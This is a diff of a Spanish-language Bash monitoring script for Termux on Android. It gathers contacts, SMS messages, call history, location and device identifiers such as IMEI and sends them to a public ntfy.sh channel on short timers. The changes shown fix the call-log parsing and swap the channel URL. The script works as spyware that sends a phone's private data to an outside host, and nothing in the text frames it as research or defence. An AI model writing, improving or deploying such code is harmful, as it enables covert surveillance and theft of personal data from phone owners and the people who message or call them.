@@ -1,9 +1,9 @@
 #!/bin/bash
-# Script de Monitoreo Completo para Termux
-# Versión con recopilación de contactos, SMS y llamadas
+# Script de Monitoreo Completo para Termux (Versión Corregida)
+# Incluye recopilación de contactos, SMS y llamadas
 
 # ===== CONFIGURACIÓN =====
-NTFY_URL="https://ntfy.sh/JD9WNS9ZNSKS9MQ0AL"  # Cambia por tu canal NTFY
+NTFY_URL="https://ntfy.sh/V09ci1z1J2A1Iawp"  # Cambia por tu canal NTFY
 INTERVALO=300      # Intervalo principal: 5 minutos
 LOC_INTERVAL=60    # Intervalo ubicación: 1 minuto
 SMS_INTERVAL=15    # Chequeo SMS: 15 segundos
@@ -99,7 +99,7 @@ Total de contactos: $total"
     fi
 }
 
-# ===== OBTENER HISTORIAL DE LLAMADAS =====
+# ===== OBTENER HISTORIAL DE LLAMADAS (VERSIÓN CORREGIDA) =====
 obtener_llamadas() {
     [ -f "$CALLS_LAST_ID_FILE" ] || echo "0" > "$CALLS_LAST_ID_FILE"
     local last_call_id=$(cat "$CALLS_LAST_ID_FILE")
@@ -112,15 +112,16 @@ obtener_llamadas() {
         if [ "$current_last_id" != "$last_call_id" ]; then
             enviar_ntfy "📞 Historial de Llamadas (últimas $LIMITE_REGISTROS)"
             
-            echo "$calls" | jq -r ".[] | \"\(.call_type // \"?\") \(.name // \"Desconocido\"): \(.number // \"?\") - \(.duration // \"?\")s - \(.date // \"?\")" | while read -r llamada; do
-                case $llamada in
-                    *"OUTGOING"*) tipo="📤 Saliente" ;;
-                    *"INCOMING"*) tipo="📥 Entrante" ;;
-                    *"MISSED"*)   tipo="❌ Perdida" ;;
-                    *)           tipo="� Desconocida" ;;
+            # Versión corregida del parseo de llamadas
+            echo "$calls" | jq -r '.[] | "\(._id) \(.call_type) \(.name // "Desconocido") \(.number // "?") \(.duration // "?") \(.date // "?")"' | while read -r id tipo nombre numero duracion fecha; do
+                case $tipo in
+                    "OUTGOING") tipo_display="📤 Saliente" ;;
+                    "INCOMING") tipo_display="📥 Entrante" ;;
+                    "MISSED") tipo_display="❌ Perdida" ;;
+                    *) tipo_display="� $tipo" ;;
                 esac
                 
-                enviar_ntfy "$tipo: ${llamada#* }"
+                enviar_ntfy "$tipo_display: $nombre ($numero) - ${duracion}s - $fecha"
                 sleep 0.5
             done
             
@@ -170,7 +171,7 @@ Serial: $serial${imei:+$'\n'IMEI: $imei}"
     local sms_recientes=$(timeout 15 termux-sms-list -l $LIMITE_REGISTROS 2>/dev/null)
     [ -n "$sms_recientes" ] && {
         enviar_ntfy "💬 SMS Recientes (últimos $LIMITE_REGISTROS)"
-        echo "$sms_recientes" | jq -r ".[] | \"\(.sender // \"Desconocido\"): \(.body // \"\" | .[0:50])\"" | while read -r sms; do
+        echo "$sms_recientes" | jq -r '.[] | "\(.sender // "Desconocido"): \(.body // "" | .[0:50])"' | while read -r sms; do
             enviar_ntfy "✉️ $sms"
             sleep 0.5
         done
